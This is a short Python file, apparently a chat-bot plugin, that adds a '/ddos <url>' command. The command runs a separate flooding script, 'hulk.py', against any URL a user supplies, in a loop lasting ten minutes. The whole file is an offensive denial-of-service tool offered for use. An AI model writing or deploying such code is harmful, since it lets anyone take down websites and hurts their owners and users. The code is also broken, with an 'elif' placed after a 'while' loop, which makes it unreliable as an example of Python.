import sys
import os
import time
import socket
import random
from alexa.events import register
import subprocess

@register(pattern="/ddos (.*)")
async def ddos(event): 
  url = event.pattern_match.group(1)
  cmnd = f"{url}"
  timeout = 600
  timeout_start = time.time()
  while time.time() < timeout_start + timeout:
     subprocess.run(["python", "hulk.py", cmnd, "safe"])
  elif time.time() >= timeout_start + timeout:
     raise KeyboardInterrupt
